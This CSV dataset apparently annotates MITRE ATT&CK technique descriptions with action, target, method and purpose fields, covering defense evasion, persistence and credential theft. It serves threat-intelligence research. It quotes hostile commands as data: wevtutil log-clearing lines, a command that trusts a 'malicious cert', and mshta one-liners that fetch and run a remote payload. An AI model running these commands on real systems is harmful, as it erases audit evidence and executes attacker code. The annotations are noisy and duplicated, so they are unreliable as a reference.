Id,_0,_1,_2,action_what,action_where,alternative_technique,how,how_what,how_where,postcondition,precondition,tactic,technique,when,when_condition,when_object,where_attribute,why_state,why_what,why_where
t1183,,,280,installing,ifeo mechanisms,,,,,,,"persistence,privilege escalation,defense evasion",image file execution options injection,,,,,persistence via continuous invocation,,
t1183,,,281,use,ifeo,,registering invalid debuggers that redirect and effectively disable various system and security applications,,,,,"persistence,privilege escalation,defense evasion",image file execution options injection,,,,,defense evasion,,
t1054,,,282,block,indicators,,,,,,,defense evasion,indicator blocking,,,,,,,
t1054,,,283,modifying,events,,,,,,,defense evasion,indicator blocking,,,,captured by sensors,gathered and analyzed.,,
t1054,,,284,block,sensor settings,,,,,,,defense evasion,indicator blocking,,,,stored in configuration files,disable or maliciously redirect event telemetry,,
t1054,,,284,block,registry keys,,,,,,,defense evasion,indicator blocking,,,,stored in configuration files,disable or maliciously redirect event telemetry,,
t1066,,,286,modify,tool,,removing the indicator,,,,,defense evasion,indicator removal from tools,,,,malicious,,,
t1066,,,287,use,updated version,,,,,,,defense evasion,indicator removal from tools,,,,,,,
t1066,,,288,use,software packing,,,,,,,defense evasion,indicator removal from tools,,,,,,,
t1066,,,289,modify,file,,,,,,,defense evasion,indicator removal from tools,,,,,different signature,,
t1070,,,290,delete,artifacts,,,,,,,defense evasion,indicator removal on host,,,,,,,
t1070,,,290,alter,artifacts,,,,,,,defense evasion,indicator removal on host,,,,,,,
t1070,,,291,compromise,logs,,,,,,,defense evasion,indicator removal on host,,,,,,,
t1070,,,291,compromise,captured files,,,,,,,defense evasion,indicator removal on host,,,,,,,
t1070,,,292,performing,integrity of security solutions,,,,,,,defense evasion,indicator removal on host,,,,,,,
t1070,,,293,clear,actions,,,,,,,defense evasion,indicator removal on host,,,,"account management, account logon and directory service access",,,
t1070,,,294,cleared,events,,wevtutil cl systemwevtutil cl applicationwevtutil cl security powershell,,,,,defense evasion,indicator removal on host,,,,,hide their activities,,
t1070,,,294,cleared,logs,,wevtutil cl systemwevtutil cl applicationwevtutil cl security powershell,,,,,defense evasion,indicator removal on host,,,,,hide their activities,,
t1202,,,295,abuse,windows utilities,,,,,,,defense evasion,indirect command execution,,,,,defense evasion  perform arbitrary execution while subverting detections  mitigation controls (such as group policy) that limit/prevent the usage of cmd  file extensions more commonly associated with malicious payloads.,,
t1202,,,295,use,windows utilities,,,,,,,defense evasion,indirect command execution,,,,,defense evasion  perform arbitrary execution while subverting detections  mitigation controls (such as group policy) that limit/prevent the usage of cmd  file extensions more commonly associated with malicious payloads.,,
t1056,,1,296,capture,user input,,"performing a uac prompt , wrapping the windows default credential provider , keylogging",,,credential-captured,keylogging-enable,collection,input capture,"<condition> <object>credential<\object> dumping efforts are not effective <\condition>, and may require an <condition><object>adversary<\object> to remain passive on a system for a period of time<\condition>",<object>credential<\object> dumping efforts are not effective,credential,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",,
t1056,,1,296,capture,keystroke,,"performing a uac prompt , wrapping the windows default credential provider , keylogging",,,credential-captured,keylogging-enable,collection,input capture,"<condition> <object>credential<\object> dumping efforts are not effective <\condition>, and may require an <condition><object>adversary<\object> to remain passive on a system for a period of time<\condition>",<object>credential<\object> dumping efforts are not effective,credential,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",,
t1056,,1,296,intercept,user input,,"performing a uac prompt , wrapping the windows default credential provider , keylogging",,,credential-captured,keylogging-enable,collection,input capture,"<condition> <object>credential<\object> dumping efforts are not effective <\condition>, and may require an <condition><object>adversary<\object> to remain passive on a system for a period of time<\condition>",<object>credential<\object> dumping efforts are not effective,credential,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",,
t1056,,1,296,intercept,keystroke,,"performing a uac prompt , wrapping the windows default credential provider , keylogging",,,credential-captured,keylogging-enable,collection,input capture,"<condition> <object>credential<\object> dumping efforts are not effective <\condition>, and may require an <condition><object>adversary<\object> to remain passive on a system for a period of time<\condition>",<object>credential<\object> dumping efforts are not effective,credential,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",,
t1056,1,,297,install-code,portals,,,,,credential-captured,portal-reachable/vpn-reachable,collection,input capture,,,,externally facing,capture and transmit credentials of users;  maintain network access,,
t1056,1,,297,install-code,vpn login page,,,,,credential-captured,portal-reachable/vpn-reachable,collection,input capture,,,,externally facing,capture and transmit credentials of users;  maintain network access,,
t1141,,1,298,mimic,input prompt,,"seemingly legitimate prompt , fake installer requiring additional access , fake malware removal suite",,,,,credential access,input prompt,,,,,<what>prompt<\what> <where>users<\where> for credentials;<what>collect<\what> <where>credentials<\where> via various languages such as applescript[2][3] and powershell,"prompt,collect","users,credential"
t1141,,1,298,use,input prompt,,"seemingly legitimate prompt , fake installer requiring additional access , fake malware removal suite",,,,,credential access,input prompt,,,,,<what>prompt<\what> <where>users<\where> for credentials;<what>collect<\what> <where>credentials<\where> via various languages such as applescript[2][3] and powershell,"prompt,collect","users,credential"
t1141,,,299,prompt-user,credential,,,,,,,credential access,input prompt,,,,,,,
t1130,,,301,install,root certificate,,,,,,,defense evasion,install root certificate,,,,,<what>degrade<\what> the <where>security of that system<\where>,degrade,security of that system
t1130,,,302,use,install root certificate,,,,,,,defense evasion,install root certificate,compromised systems <condition>connect over https to adversary controlled web servers<\condition>,connect over https to adversary controlled web servers,,,"avoid security warnings prompting users , <what>collect<\what> <where>login credentials<\where>",collect,login credentials
t1130,,,303,avoid,security warning,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,303,bypass,security warning,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,304,collect,login credential,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,305,use,root certificate,,,,,,,defense evasion,install root certificate,,,,malware/adware,provide a man-in-the-middle capability for <what>intercepting<\what> <where>information<\where> transmitted over secure tls/ssl communications,intercepting,information
t1130,,,306,intercept,information,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,307,clone,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,clone,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,clone,cloned certificate,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,reinstall,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,reinstall,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,reinstall,cloned certificate,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,use,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,use,root certificates,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,307,use,cloned certificate,,,,,,,defense evasion,install root certificate,,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.)","sign , bypass","code , signature validation tools , sysinternals , antivirus"
t1130,,,308,sign,code,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,309,bypass,signature validation tool,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,310,bypass,antivirus,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,311,bypass,sysinternals,,,,,,,defense evasion,install root certificate,,,,,,,
t1130,,,312,use,command,,,,,,,defense evasion,install root certificate,,,,/usr/bin/security add-trusted-cert -d -r trustroot -k /library/keychains/system.keychain /path/to/malicious/cert,<what>install<\what> a malicious <where>certificate<\where>,install,certificate
t1130,,,313,install,certificate,,,,,,,defense evasion,install root certificate,,,,,,,
t1118,,,314,use,installutil,,trusted windows utility,,,,,defense evasion,install util,,,,,<what> proxy execution <\what> of <where> code <\where>,proxy execution,code
t1118,,,316,use,installutil,,trusted windows utility,,,,,"defense evasion,execution",installutil,,,,,proxy <what>execution<\what> of <where>code<\where>,execution,code
t1118,,,317,proxy execute,code,,,,,,,"defense evasion,execution",installutil,,,,,,,
t1118,,,318,use,installutil,,<what>use<\what> of <where>attributes<\where> within the binary,,,,,"defense evasion,execution",installutil,,,,,<what>bypass<\what> <where>process whitelisting<\where>,bypass,process whitelisting
t1118,,,319,bypass,process whitelisting,code signing,,,,,,"defense evasion,execution",installutil,,,,,,,
t1208,,,320,requet,services ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,requet,Kerberos Ticket Granting Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,requet,Kerberos Ticket Granting Service Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,requet,TGT,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,requet,TGS,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,requet,brute-force,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,services ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,services ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,Kerberos Ticket Granting Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,Kerberos Ticket Granting Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,Kerberos Ticket Granting Service Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,Kerberos Ticket Granting Service Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,TGT,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,TGT,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,TGS,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,capture,brute-force,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,TGS,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,perform,brute-force,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,services ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,Kerberos Ticket Granting Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,Kerberos Ticket Granting Service Ticket,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,TGT,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,TGS,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,320,execute,brute-force,,<what>using<\what> <where>service tickets<\where> captured from network traffic,,,,,credential access,kerberoasting,,,,offline,,expose,plaintext credentials
t1208,,,321,crack,hash,,access to valid accounts,,,,,credential access,kerberoasting,,,,,"enable persistence, privilege escalation, and lateral movement",,
t1215,,,322,use,loadable kernel modules (lkms),,"<what> hiding <\what> itself, selective hiding <where>files <\where>, <where> processes <\where> and <where> network activity<\where>, as well as <where> log tampering<\where>, <what> providing <\what> <where> authenticated backdoors <\where> and <what>enabling <\what> <where> root access <\where> to non-privileged users","hiding  ,  providing  , enabling","files  ,  processes  ,  network activity ,  log tampering ,  authenticated backdoors  ,  root access",,,persistence,kernel modules and extensions,,,,,covertly persist on a system and evade defenses,,
t1142,,,323,access,keychain,,using security command line utility,,,,,credential access,keychain,adversary <condition>knows the <object>credentials<\object> for the login keychain<\condition>,knows the <object>credentials<\object> for the login keychain,credentials,,collect credential,collect,credentials
t1159,,,324,install,launch agent,,launchd or launchctl,,,,,persistence,launch agent,administrator privileges,,,,execute at login  <what>load<\what> a <where> plist <\where>,load,plist
t1160,,,325,install,launch daemon,,launchd or launchctl,,,,,"persistence,privilege escalation",launch daemon,executed under root privileges,,,,execute at startup  load a plist into the appropriate directories,,
t1160,,,326,use,service,,,,,,,"persistence,privilege escalation",launch daemon,,,,,escalate privileges from administrator to root,,
t1161,,,329,remediate,digital signatures,,<what>removing <\what>the <where> lc_code_signature<\where>command,removing,lc_code_signature,,,persistence,lc_load_dylib addition,,,,modified binary,,,
t1149,,,330,hijack,entry point for a binary,,<what>modifying<\what> a <where>binary<\where> in this(lc_main hijacking) way,,,,,defense evasion,lc_main hijacking,,,,"lc_main , lc_thread , lc_unixthread","initial execution <what>flows<\what> to a malicious addition , <where>application whitelisting<\where> can be <what>bypassed<\what>","flows , bypassed",application whitelisting
t1149,,,331,modify,binary,,,,,,,defense evasion,lc_main hijacking,,,,,,,
t1149,,,332,bypass,whitelisting application,,,,,,,defense evasion,lc_main hijacking,,,,,,,
t1171,,,333,spoof,authoritative source,,<what>responding<\what> to <where>llmnr (udp 5355)/nbt-ns (udp 137) traffic<\where>,,,,,credential access,llmnr/nbt-ns poisoning and relay,,,,,name resolution; <what>obtain<\what> the plaintext <where>passwords<\where>,,
t1171,,,334,send,username,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,send,ntlmv2 hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,send,hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,collect,username,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,collect,ntlmv2 hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,collect,hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,crack,username,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,crack,ntlmv2 hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,334,crack,hash,,"tools that monitor the ports for traffic , network sniffing , brute force",,,,,credential access,llmnr/nbt-ns poisoning and relay,<object>requested host<\object> belongs to a resource that <condition>requires identification/authentication<\condition>,requires identification/authentication,requested host,,<what>obtain<\what> the plaintext <where>passwords<\where>,obtain,passwords
t1171,,,335,intercept,ntlmv2 hash,,,use,tool/responder/metasploit/nbnspoof,destination-adversary,destination-benign,credential access,llmnr/nbt-ns poisoning and relay,access to authentication path,,,,,,
t1171,,,336,relay,ntlmv2 hash,,,,,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,<what>access<\what> and <what>execute<\what> <where>code<\where>,"access , execute",code
t1171,,,337,use,tool,,,using,service tickets,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,<what>poison<\what> <where>name services<\where>,poison,name services
t1171,,,337,use,responder,,,using,service tickets,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,<what>poison<\what> <where>name services<\where>,poison,name services
t1171,,,337,use,metasploit,,,using,service tickets,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,<what>poison<\what> <where>name services<\where>,poison,name services
t1171,,,337,use,nbnspoof,,,using,service tickets,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,<what>poison<\what> <where>name services<\where>,poison,name services
t1171,,,338,poison,name service,,using tool/responder/metasploit/nbnspoof,,,credential-exposed,credential-protected,credential access,llmnr/nbt-ns poisoning and relay,,,,,,,
t1162,,,339,register,login item,,,,,,,persistence,login item,,,,,,,
t1037,,,341,insert,code,,,,,,,"persistence,lateral movement",logon scripts,access these scripts <object> local credentials <\object> or an <object> administrator account <\object> may be necessary <condition>require<\condition>,"require , require","local credentials  ,  local credentials",logon script,<what> execute <\what> their <where> tools <\where> maintain persistence on a single system,execute,tools
t1177,,,342,target,lsass.exe drivers,,"<what> replacing <\what> or <what> adding <\what> <attribute> illegitimate <\attribute> <where> drivers <\where> (e.g., <where> dll side-loading <\where>or <where> dll search order hijacking <\where>)","replacing  ,  adding","drivers  ,  dll side-loading  ,  dll search order hijacking",,,"execution,persistence",lsass driver,,,,,obtain execution  persistence,,
t1177,,,342,use,lsass.exe drivers,,"<what> replacing <\what> or <what> adding <\what> <attribute> illegitimate <\attribute> <where> drivers <\where> (e.g., <where> dll side-loading <\where>or <where> dll search order hijacking <\where>)","replacing  ,  adding","drivers  ,  dll side-loading  ,  dll search order hijacking",,,"execution,persistence",lsass driver,,,,,obtain execution  persistence,,
t1177,,,343,triggered,code execution,,continuous <where> lsa operations<\where>,,lsa operations,,,"execution,persistence",lsass driver,,,,,,,
t1185,,1,344,inject-software,browser,,"setting up an http proxy, use-security vulnerability/browser functionality",use,security vulnerability/browser functionality,,,collection,man in the browser,browser has-a SeDebugPrivilege; Process is-a high intigrity,"require,high-intregity","sedebugprivilege,process",,"change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic"
t1185,,,344,redirect,traffic,,set-http-proxy browser,set-http-proxy,browser,,,collection,man in the browser,browser has-a SeDebugPrivilege; Process is-a high intigrity,"require,high-intregity","sedebugprivilege,process",,"change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic"
t1036,,,345,manipulate,name of an executable,,,,,,,defense evasion,masquerading,,,,,evading defenses,,
t1036,,,345,manipulate,location of an executable,,,,,,,defense evasion,masquerading,,,,,evading defenses,,
t1036,,,346,place executable,trusted directory,,,,,,,defense evasion,masquerading,,,,commonly,,,
t1036,,,347,move,common system utility,,,,,,,defense evasion,masquerading,,,,,"<what>bypass<\what> <where>tools<\where> that trust executables by relying on file name or path , <what>deceive<\what> <where>defenders<\where> and <where>system administrators<\where> into thinking a file is benign by associating the name with something","bypass , deceive","tools , defenders , system administrators"
t1036,,,347,move,program,,,,,,,defense evasion,masquerading,,,,,"<what>bypass<\what> <where>tools<\where> that trust executables by relying on file name or path , <what>deceive<\what> <where>defenders<\where> and <where>system administrators<\where> into thinking a file is benign by associating the name with something","bypass , deceive","tools , defenders , system administrators"
t1036,,,347,rename,common system utility,,,,,,,defense evasion,masquerading,,,,,"<what>bypass<\what> <where>tools<\where> that trust executables by relying on file name or path , <what>deceive<\what> <where>defenders<\where> and <where>system administrators<\where> into thinking a file is benign by associating the name with something","bypass , deceive","tools , defenders , system administrators"
t1036,,,347,rename,program,,,,,,,defense evasion,masquerading,,,,,"<what>bypass<\what> <where>tools<\where> that trust executables by relying on file name or path , <what>deceive<\what> <where>defenders<\where> and <where>system administrators<\where> into thinking a file is benign by associating the name with something","bypass , deceive","tools , defenders , system administrators"
t1036,,,348,bypass,tool,,,,,,,defense evasion,masquerading,,,,,,,
t1036,,,349,use,right-to-left override (rtlo or rlo) character (u+202e),,,,,,,defense evasion,masquerading,,,,,means of <what>tricking<\what> a <where>user<\where> into executing what they think is a benign file type but is actually executable code,tricking,user
t1036,,,350,rename,utility,,,,,,,defense evasion,masquerading,,,,legitimate,avoid detections,,
t1036,,,351,move  utility,directory,,,modifying,binary,,,defense evasion,masquerading,,,,different,avoid detections,,
t1036,,,352,rename,utility,,,,,,,defense evasion,masquerading,,,,legitimate,avoid detections,,
t1036,,,353,change,name of  process,,,,,,,defense evasion,masquerading,,,,trusted or benign process,avoid detections,,
t1031,,,354,modifiy,service configuration,,"utilities , sc.exe , reg",,,,,persistence,modify existing service,,,,,,,
t1031,,,355,modify,service,,"<what>using<\what> <where>system utilities<\where> , <what>using<\what> <where>custom tools<\where>",,,,,persistence,modify existing service,,,,,"<what>persist<\what> <where>malware<\where> on a system  , <what>interact<\what> with the <where>windows api<\where> , <what>interrupt<\what> their <where>functionality<\where> , <what>enable<\what> <where>services<\where> that are disabled","persist , interact , interrupt , enable","malware , windows api , functionality , services"
t1031,,,356,kill,service,,,,,,,persistence,modify existing service,,,,,<what>execute<\what> malicious <where>recovery programs<\where>/<where>commands<\where>,execute,"recovery programs , commands"
t1031,,,357,execute,program,,,,,,,persistence,modify existing service,,,,,,,
t1112,,,358,interact,windows registry,,,,,,,defense evasion,modify registry,"access to specific areas of the registry depends on <condition>account permissions<\condition>, some requiring <condition>administrator-level access<\condition>",account permissions,,,"<what>hide <\what> <where>configuration information<\where> within registry keys , <what>remove<\what> <where>information<\where> as part of cleaning up , aid inpersistence and execution","hide  , remove","configuration information , information"
t1112,,,359,remove,information,,,prepending,key names,,,defense evasion,modify registry,,,,,,,
t1112,,,360,use,built-in windows command-line utility reg,,,,,,,defense evasion,modify registry,,,,,local or remote registry modification,,
t1112,,,361,use,remote access tool,,windows api,,,,,defense evasion,modify registry,,,,,<what>interact<\what> with the <where>registry<\where>,interact,registry
t1112,,,362,modify,registry,,<what>prepending<\what> <where>key names<\where> with a <attribute>null character<\attribute>,,,,,defense evasion,modify registry,,,,,<what>hide<\what> <where>keys<\where>,hide,keys
t1112,,,363,modify,registry,,,,,,,defense evasion,modify registry,"it requires the <condition><object>remote registry service<\object> to be running on the target system<\condition>  , <condition>valid accounts<\ condition > are required, along with <condition>access to the remote system's windows admin shares<\condition","<object>remote registry service<\object> to be running on the target system , valid accounts<\condition> are required, along with <condition>access to the remote system's windows admin shares",remote registry service,remote system,aid in execution of files as part of lateral movement,,
t1170,,,364,use,mshta.exe,,trusted windows utility,,,,,defense evasion,mshta,,,,,<what> proxy execution <\what>of <attribute> malicious  .hta <\attribute> <where> files <\where> and <where> javascript<\where> or <where>vbscript <\where>,proxy execution,"files  ,  javascript , vbscript"
t1170,,,365,leveraging,mshta.exe,,initial compromise,,,,,defense evasion,mshta,,,,,<what> execution <\what> of <where> code <\where>,execution,code
t1170,,,365,use,mshta.exe,,initial compromise,,,,,defense evasion,mshta,,,,,<what> execution <\what> of <where> code <\where>,execution,code
t1170,,,366,executed,files,,inline script: mshta vbscript:close(execute(getobject(script:https[:]//webserver/payload[.]sct))),,,,,defense evasion,mshta,,,,mshta.exe,,,
t1170,,,367,executed,files,,urls: mshta http[:]//webserver/payload[.]hta,,,,,defense evasion,mshta,,,,,,,
t1170,,,368,use,mshta.exe,,,,,,,defense evasion,mshta,,,,,<what> bypass <\what> <where> application whitelisting solutions <\where>,bypass,application whitelisting solutions
t1170,,,369,executes,mshta.exe,,<attribute> outside of the internet explorer's <\attribute> <where> security context <\where>,,security context,,,defense evasion,mshta,,,,,,,
t1170,,,370,bypasses,security settings,,,,,,,defense evasion,mshta,,,,browser,,,
t1170,,,371,use,mshta.exe,,trusted windows utility,,,,,"defense evasion,execution",mshta,,,,,proxy <what>execution <\what> of malicious <where>.hta files<\where> and <where>javascript<\where> or <where>vbscript<\where>,execution,".hta files , javascript , vbscript"
t1170,,,372,proxy execute,.hta file,,trusted windows utility,use,mshta.exe in inline script,,,"defense evasion,execution",mshta,,,,,,,
t1170,,,373,proxy execute,javascript,,trusted windows utility,use,mshta.exe with url in command,,,"defense evasion,execution",mshta,,,,,,,
t1170,,,374,proxy execute,VBScript,,trusted windows utility,,,,,"defense evasion,execution",mshta,,,,,,,
